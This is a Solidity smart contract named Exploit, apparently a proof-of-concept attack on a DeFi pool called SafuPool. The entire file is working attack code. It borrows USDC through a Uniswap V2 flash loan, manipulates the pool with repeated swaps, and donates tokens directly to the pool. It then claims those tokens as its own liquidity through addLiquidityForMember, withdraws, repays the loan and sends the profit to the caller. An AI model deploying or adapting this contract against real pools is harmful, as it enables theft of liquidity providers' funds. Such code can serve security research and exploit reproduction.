// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ISafuPool {
    function swap(address toToken, uint256 amount) external returns (uint);
    function swapTo(address token, address member) external payable returns (uint);
    function addLiquidity(uint256 _baseAmount, uint256 _tokenAmount) external returns (uint);
    function addLiquidityForMember(address member) external returns (uint);
    function removeLiquidityForMember(address member) external returns (uint, uint);
    function removeAllLiquidity() external returns (uint, uint);
}

contract Exploit {
    IUniswapV2Pair private pair;
    IERC20 private usdc;
    IERC20 private safu;
    ISafuPool private safuPool;

    constructor(address _pair, address _usdc, address _safu, address _safuPool) {
        pair = IUniswapV2Pair(_pair);
        usdc = IERC20(_usdc);
        safu = IERC20(_safu);
        safuPool = ISafuPool(_safuPool);
    }

    function start(uint256 maxAmount) external {
        bool t0 = pair.token0() == address(usdc);
        if (t0) {
            pair.swap(maxAmount, 0, address(this), new bytes(0x1));
        } else {
            pair.swap(0, maxAmount, address(this), new bytes(0x1));
        }
        usdc.transfer(msg.sender, usdc.balanceOf(address(this)));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(pair), "invalid sender");
        uint256 usdcAmount = usdc.balanceOf(address(this));
        safu.approve(address(safuPool), type(uint256).max);
        usdc.approve(address(safuPool), type(uint256).max);

        uint256 amount = usdcAmount / 100;
        for(uint256 i; i < 5; ++i) {
            safuPool.swap(address(safu), amount);
        }
        amount = safu.balanceOf(address(this));
        safuPool.addLiquidity(amount, amount);

        amount = usdcAmount / 100;
        for(uint256 i; i < 5; ++i) {
            safuPool.swap(address(safu), amount);
        }
        //transfer large amount of usdc
        usdc.transfer(address(safuPool), usdc.balanceOf(address(this)) * 4 / 5);
        safu.transfer(address(safuPool), safu.balanceOf(address(this)));

        safuPool.removeAllLiquidity();
        //add liquidity for the token transferred earlier
        safuPool.addLiquidityForMember(address(this));
        safuPool.removeAllLiquidity();

        amount = safu.balanceOf(address(this)) / 12;
        for(uint256 i; i < 12; ++i) {
            safuPool.swap(address(usdc), amount);
        }
        //repay flashloan
        usdc.transfer(address(pair), usdcAmount * 1000 / 997 + 1);
    }
}